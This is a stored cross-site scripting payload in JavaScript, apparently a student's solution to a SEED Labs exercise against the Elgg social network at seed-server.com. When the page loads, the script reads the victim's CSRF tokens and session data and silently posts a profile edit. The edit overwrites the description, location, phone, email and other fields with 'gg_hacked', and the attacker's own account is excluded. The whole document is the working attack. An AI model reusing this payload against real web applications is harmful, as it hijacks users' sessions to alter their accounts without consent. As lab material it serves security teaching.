<script type="text/javascript">
	window.onload = function(){

	var sendurl="http://www.seed-server.com/action/profile/edit"; //FILL IN

	var content = new FormData();
	content.append('__elgg_token', elgg.security.token.__elgg_token);
	content.append('__elgg_ts', elgg.security.token.__elgg_ts);
	content.append('name', elgg.session.user.name);
	content.append('description', '1905002');
	content.append('accesslevel[description]', '1');
	content.append('briefdescription', 'gg_hacked');
	content.append('accesslevel[briefdescription]', '1');
	content.append('location', 'gg_hacked');
	content.append('accesslevel[location]', '1');
	content.append('interests', 'gg_hacked');
	content.append('accesslevel[interests]', '1');
	content.append('skills', 'gg_hacked');
	content.append('accesslevel[skills]', '1');
	content.append('contactemail', 'try34@gmail.com');
	content.append('accesslevel[contactemail]', '1');
	content.append('phone', 'gg_hacked');
	content.append('accesslevel[phone]', '1');
	content.append('mobile', 'gg_hacked');
	content.append('accesslevel[mobile]', '1');
	content.append('website', 'gg_hacked');
	content.append('accesslevel[website]', '1');
	content.append('twitter', 'gg_hacked');
	content.append('accesslevel[twitter]', '1');
	content.append('guid', elgg.session.user.guid);

	if(elgg.session.user.guid!=59)
	{
		var xhr = new XMLHttpRequest();
		// Configure the request
		xhr.open('POST', sendurl, true);
		// Send the content object
		xhr.send(content);
	}
	}
	
</script>
